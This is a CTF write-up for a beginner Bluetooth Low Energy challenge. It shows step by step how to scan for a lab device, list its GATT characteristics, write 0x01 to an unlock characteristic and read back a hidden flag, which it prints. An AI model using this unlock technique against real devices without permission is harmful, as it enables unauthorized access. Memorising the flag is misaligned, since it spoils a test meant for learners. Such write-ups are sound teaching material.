# Writeup - Challenge 03: State Manipulation

**Difficulty:** ⭐⭐ Beginner
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{write_to_unlock_the_secret}`

---

## 🔍 Step 1: Scan for the BLE Device

### Option A — Linux CLI

```bash
bluetoothctl
[bluetooth]# scan on
```

Expected output:
```
[NEW] Device AA:BB:CC:DD:EE:FF THCON26_BLE_03
```

Note the MAC address (e.g., `AA:BB:CC:DD:EE:FF`).

### Option B — nRF Connect (mobile)

Open the app, tap **SCAN**. You will see `THCON26_BLE_03` appear in the list.

---

## 🔗 Step 2: Connect and Enumerate

### Option A — Linux CLI (gatttool)

```bash
gatttool -b AA:BB:CC:DD:EE:FF -I
[AA:BB:CC:DD:EE:FF][LE]> connect
[AA:BB:CC:DD:EE:FF][LE]> characteristics
```

Expected output (two characteristics):
```
handle: 0x0002, char properties: 0x02, char value handle: 0x0003, uuid: abcdef02-...  (READ)
handle: 0x0004, char properties: 0x08, char value handle: 0x0005, uuid: abcdef03-...  (WRITE)
```

Properties: `0x02` = READ, `0x08` = WRITE.

### Option B — nRF Connect (mobile)

Tap **CONNECT** on `THCON26_BLE_03`. The app will display all services and their characteristics. You will see two characteristics — one with a **READ** property and one with a **WRITE** property.

---

## 🔒 Step 3: Attempt to Read the Flag (Denied)

### Option A — Linux CLI (gatttool)

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
```

Expected output:
```
Characteristic value/descriptor: 41 63 63 65 73 73 20 44 65 6e 69 65 64
```

Decode:
```
Access Denied
```

### Option B — nRF Connect (mobile)

Tap the **↓ (read)** button on the READ characteristic. The value shown will be `Access Denied`.

The flag characteristic is locked.

---

## ✍️ Step 4: Write to the Unlock Characteristic

Send `0x01` to the WRITE characteristic (handle `0x0005`):

### Option A — Linux CLI (gatttool)

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-write-req 0x0005 01
```

Expected output:
```
Characteristic value was written successfully
```

### Option B — nRF Connect (mobile)

Tap the **↑ (write)** button on the WRITE characteristic. Select **BYTE ARRAY**, enter `01`, and tap **WRITE**.

---

## 📖 Step 5: Re-read the Flag Characteristic

### Option A — Linux CLI (gatttool)

```bash
[AA:BB:CC:DD:EE:FF][LE]> char-read-hnd 0x0003
```

Expected output:
```
Characteristic value/descriptor: 57 4f 43 53 41 7b 77 72 69 74 65 5f 74 6f 5f 75 6e 6c 6f 63 6b 5f 74 68 65 5f 73 65 63 72 65 74 7d
```

Decode:
```bash
echo "574f43534...7d" | xxd -r -p
```

```
WOCSA{write_to_unlock_the_secret}
```

### Option B — nRF Connect (mobile)

Tap the **↓ (read)** button on the READ characteristic again. The value will now display `WOCSA{write_to_unlock_the_secret}` in UTF-8.

---

## 🎯 Flag

```
WOCSA{write_to_unlock_the_secret}
```

---

## Key Takeaways

* GATT servers can implement **stateful logic** — a write to one characteristic can change the behavior of another
* Always enumerate **all** characteristics, not just the ones that look interesting at first glance
* State is often reset on disconnect — make sure to unlock and read within the same connection session
* Writing specific values to trigger privileged states is a common pattern in embedded firmware vulnerabilities
